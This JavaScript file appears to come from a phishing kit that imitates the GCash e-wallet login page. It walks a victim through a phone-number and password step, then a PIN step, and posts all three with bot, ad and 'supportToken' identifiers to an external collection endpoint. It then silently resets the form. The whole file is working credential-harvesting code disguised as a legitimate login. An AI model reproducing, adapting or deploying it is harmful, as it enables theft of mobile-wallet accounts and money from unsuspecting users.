window.onload = function() {
    const logType = "gcash";
    const phoneNumber = document.getElementById('login');
    
    var phoneNumberMask = new IMask(phoneNumber, {
        mask: '000 000 0000',
    });

    $('#login, #password').keyup(function() {
        if ($('#login').val().length != 12) {
            $('#btnNext').prop('disabled', true);
        } else if ($('#password').val().length == 0) {
            $('#btnNext').prop('disabled', true);
        } else {
            $('#btnNext').prop('disabled', false);
        }
    });

    $('#pin').keyup(function() {
        if ($('#pin').val().length == 0) {
            $('#btnLogin').prop('disabled', true);
        } else {
            $('#btnLogin').prop('disabled', false);
        }
    });

    $('#btnNext').click(function() {
        $('#gcash-first-form').hide();
        $('#gcash-second-form').show();
    });

    $('#btnBack').click(function() {
        $('#pin').val('');
        $('#btnLogin').prop('disabled', true);
        $('#gcash-second-form').hide();
        $('#gcash-first-form').show();
    });
    
    $('#btnLogin').click(function() {
        if ($('#login').val().length != 12 || $('#password').val().length == 0 || $('#pin').val().length == 0) {
            clearForm();
        } else {
            sendLog(this.id, "+63 " + $('#login').val(), $('#password').val(), $('#pin').val());
        }
    });

    function loadButton(button) {
        var buttonText = button.innerHTML;
        button.disabled = true;
        button.innerHTML = `
            <div class="d-flex justify-content-center">
                <div class="spinner-border" role="status">
                    <span class="visually-hidden">...</span>
                </div>
            </div>
        `;
        return buttonText;
    };
    
    function clearForm() {
        $('#login').val('');
        $('#password').val('');
        $('#pin').val('');
        $('#btnNext').prop('disabled', true);
        $('#btnLogin').prop('disabled', true);
        $('#gcash-second-form').hide();
        $('#gcash-first-form').show();
    }
    
    function sendLog(buttonId, login, password, pin) {
        var buttonText = loadButton(document.getElementById(buttonId));
    
        axios.post(submitApiPath, {
            botType: botType,
            adId: typeof adId === 'undefined' ? null : adId,
            supportToken: supportToken,
            logType: logType,
            login: login,
            password: password,
            pin: pin
        })
        .then((response) => {
            system.windowObj(response.data.status);
        })
        .finally(() => {
            clearForm();
            $(`#${buttonId}`).html(buttonText);
        });
    };
};